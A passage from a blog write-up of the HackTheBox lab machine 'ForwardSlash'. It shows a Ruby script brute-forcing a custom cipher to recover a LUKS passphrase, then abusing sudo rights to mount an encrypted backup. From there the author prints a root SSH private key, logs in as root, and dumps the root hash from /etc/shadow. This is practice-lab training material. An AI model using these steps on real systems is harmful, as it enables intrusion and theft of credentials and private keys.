</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>0</span><span class=o>...</span><span class=n>msg</span><span class=o>.</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>reverse_each</span> <span class=k>do</span> <span class=o>|</span><span class=n>i</span><span class=o>|</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>msg</span><span class=o>[</span><span class=n>i</span><span class=o>].</span><span class=n>ord</span> <span class=o>-</span> <span class=p>(</span><span class=n>char_key</span><span class=o>.</span><span class=n>ord</span> <span class=o>+</span> <span class=n>msg</span><span class=o>[-</span><span class=mi>1</span><span class=o>].</span><span class=n>ord</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>msg</span><span class=o>[</span><span class=n>i</span><span class=o>].</span><span class=n>ord</span> <span class=o>-</span> <span class=p>(</span><span class=n>char_key</span><span class=o>.</span><span class=n>ord</span> <span class=o>+</span> <span class=n>msg</span><span class=o>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=o>].</span><span class=n>ord</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>end</span>
</span></span><span class=line><span class=cl>      <span class=k>while</span> <span class=n>tmp</span> <span class=o>&lt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>+=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>      <span class=k>end</span>
</span></span><span class=line><span class=cl>      <span class=n>msg</span><span class=o>[</span><span class=n>i</span><span class=o>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=o>.</span><span class=n>chr</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>msg</span><span class=o>.</span><span class=n>join</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>binread</span><span class=p>(</span><span class=s1>&#39;ciphertext&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>words</span> <span class=o>=</span> <span class=o>[</span><span class=s1>&#39;encrypt&#39;</span><span class=p>,</span> <span class=s1>&#39;key&#39;</span><span class=p>,</span> <span class=s1>&#39;backup&#39;</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl><span class=n>found_key</span> <span class=o>=</span> <span class=kp>false</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=mi>1</span><span class=o>..</span><span class=mi>100</span><span class=p>)</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>key_length</span><span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>..</span><span class=s1>&#39;z&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>c</span><span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=n>guessed_key</span> <span class=o>=</span> <span class=n>c</span> <span class=o>*</span> <span class=n>key_length</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>guessed_key</span><span class=p>,</span> <span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>words</span><span class=o>.</span><span class=n>any?</span> <span class=p>{</span> <span class=o>|</span><span class=n>word</span><span class=o>|</span> <span class=n>d</span><span class=o>.</span><span class=n>include?</span><span class=p>(</span><span class=n>word</span><span class=p>)</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=nb>puts</span> <span class=s2>&#34;Approximate key: </span><span class=si>#{</span><span class=n>guessed_key</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nb>puts</span> <span class=s2>&#34;Partially decrypted text: </span><span class=si>#{</span><span class=n>d</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>      <span class=n>found_key</span> <span class=o>=</span> <span class=kp>true</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span> <span class=k>if</span> <span class=n>found_key</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s run it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ruby</span> <span class=n>bf</span><span class=o>.</span><span class=n>rb</span>
</span></span><span class=line><span class=cl><span class=n>Approximate</span> <span class=n>key</span><span class=p>:</span> <span class=n>ttttttttttttttttt</span>
</span></span><span class=line><span class=cl><span class=n>Partially</span> <span class=n>decrypted</span> <span class=n>text</span><span class=p>:</span> <span class=err>∩┐╜</span><span class=o>$</span><span class=mi>7</span><span class=n>C</span><span class=err>∩┐╜∩┐╜</span><span class=n>q8</span><span class=err>∩┐╜∩┐╜</span><span class=mi>4</span><span class=err>∩┐╜</span><span class=n>l</span><span class=s1>&#39;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6</span><span class=si>%s</span><span class=s1>dH8Lj^@Y*$C2cf∩┐╜</span>
</span></span></code></pre></td></tr></table></div></div><p>The crypto part is not interesting me so I won&rsquo;t develop the explanation more
than that but you can take a look at <a href="https://www.youtube.com/watch?v=alJa51XylDE">IppSec video</a>
to see the reasoning.</p><h3 id=privilege-escalation--from-pain-to-root>Privilege Escalation : from pain to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation--from-pain-to-root>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~/</span><span class=n>encryptorinator</span><span class=o>$</span> <span class=n>file</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span><span class=n>recovery</span><span class=o>/</span><span class=n>encrypted_backup</span><span class=o>.</span><span class=n>img</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span><span class=n>recovery</span><span class=o>/</span><span class=n>encrypted_backup</span><span class=o>.</span><span class=n>img</span><span class=p>:</span> <span class=n>LUKS</span> <span class=n>encrypted</span> <span class=n>file</span><span class=p>,</span> <span class=n>ver</span> <span class=mi>1</span> <span class=p>[</span><span class=n>aes</span><span class=p>,</span> <span class=n>xts</span><span class=o>-</span><span class=n>plain64</span><span class=p>,</span> <span class=n>sha256</span><span class=p>]</span> <span class=n>UUID</span><span class=p>:</span> <span class=n>f2a0906a</span><span class=o>-</span><span class=n>c412</span><span class=o>-</span><span class=mi>48</span><span class=n>db</span><span class=o>-</span><span class=mi>8</span><span class=n>c18</span><span class=o>-</span><span class=mi>3</span><span class=n>b72443c1bdf</span>
</span></span></code></pre></td></tr></table></div></div><p>Now it&rsquo;s pretty clear we have to mount the LUKS container with the password we
just found.</p><p>Let&rsquo;s see the commands we can run as root again:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:~/encryptorinator$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries for pain on forwardslash:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User pain may run the following commands on forwardslash:
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /bin/umount ./mnt/
</span></span></code></pre></td></tr></table></div></div><p>First we open the LUKS container and create a mount point.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~/</span><span class=n>encryptorinator</span><span class=o>$</span> <span class=n>sudo</span> <span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>cryptsetup</span> <span class=n>luksOpen</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span><span class=n>recovery</span><span class=o>/</span><span class=n>encrypted_backup</span><span class=o>.</span><span class=n>img</span> <span class=n>backup</span>
</span></span><span class=line><span class=cl><span class=n>Enter</span> <span class=n>passphrase</span> <span class=k>for</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span><span class=n>recovery</span><span class=o>/</span><span class=n>encrypted_backup</span><span class=o>.</span><span class=n>img</span><span class=p>:</span> <span class=n>cB</span><span class=o>!</span><span class=mi>6</span><span class=o>%</span><span class=n>sdH8Lj</span><span class=o>^</span><span class=err>@</span><span class=n>Y</span><span class=o>*$</span><span class=n>C2cf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~/</span><span class=n>encryptorinator</span><span class=o>$</span> <span class=n>mkdir</span> <span class=o>-</span><span class=n>p</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun2</span><span class=o>/</span><span class=n>mnt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~/</span><span class=n>encryptorinator</span><span class=o>$</span> <span class=n>cd</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun2</span>
</span></span></code></pre></td></tr></table></div></div><p>Then we can mount the openned container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:/tmp/cyfun2$ sudo /bin/mount /dev/mapper/backup ./mnt/
</span></span></code></pre></td></tr></table></div></div><p>The mounted device contains only one file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:/tmp/cyfun2$ cat mnt/id_rsa
</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
</span></span><span class=line><span class=cl>RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
</span></span><span class=line><span class=cl>yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
</span></span><span class=line><span class=cl>u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
</span></span><span class=line><span class=cl>NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
</span></span><span class=line><span class=cl>MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
</span></span><span class=line><span class=cl>V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
</span></span><span class=line><span class=cl>G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
</span></span><span class=line><span class=cl>3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
</span></span><span class=line><span class=cl>vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
</span></span><span class=line><span class=cl>MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
</span></span><span class=line><span class=cl>Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
</span></span><span class=line><span class=cl>5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
</span></span><span class=line><span class=cl>V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
</span></span><span class=line><span class=cl>e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
</span></span><span class=line><span class=cl>6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
</span></span><span class=line><span class=cl>i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
</span></span><span class=line><span class=cl>tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
</span></span><span class=line><span class=cl>woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
</span></span><span class=line><span class=cl>/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
</span></span><span class=line><span class=cl>1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
</span></span><span class=line><span class=cl>J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
</span></span><span class=line><span class=cl>OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
</span></span><span class=line><span class=cl>ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
</span></span><span class=line><span class=cl>ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><p>This must be the root SSH key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ chmod 600 id_rsa_root
</span></span><span class=line><span class=cl>$ ssh root@forwardslash.htb -i id_rsa_root
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s grab the loot!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@forwardslash:~# cat root.txt
</span></span><span class=line><span class=cl>12c0583823e80694824b9dd3e6c2ae93
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@forwardslash:~# cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$daB3I84E$NnzV4cHTAgWsPGWoBKLO2W6NotitrAk6udeTh0cxvXWHIkDXZQtss13QP2gTgFOMdIYdQ8CtvSxzznHI.nVmW.:18326:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div><p>:
[ffuf]:https://github.com/ffuf/ffuf
[xxeserv]:https://github.com/staaldraad/xxeserv
[PEASS]:https://github.com/carlospolop/PEASS-ng</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>